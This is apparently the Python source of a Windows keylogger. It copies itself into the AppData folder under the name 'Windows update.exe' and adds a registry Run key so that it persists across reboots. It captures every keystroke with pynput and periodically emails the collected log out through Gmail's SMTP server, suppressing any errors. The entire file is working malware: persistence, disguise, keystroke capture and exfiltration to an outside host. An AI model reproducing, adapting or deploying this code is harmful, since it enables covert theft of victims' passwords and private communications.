import os
import shutil
import subprocess
import sys
import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.become_persistent()
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password


    @staticmethod
    def become_persistent():
        file_location = os.environ["appdata"] + "\\Windows update.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        try:
            message = MIMEText('\n {}'.format(message).encode('utf-8'), _charset='utf-8')
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, 'Subject: xxx-pythman-xxx. \n{}'.format(message))
            server.quit()
        except Exception:
            pass

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
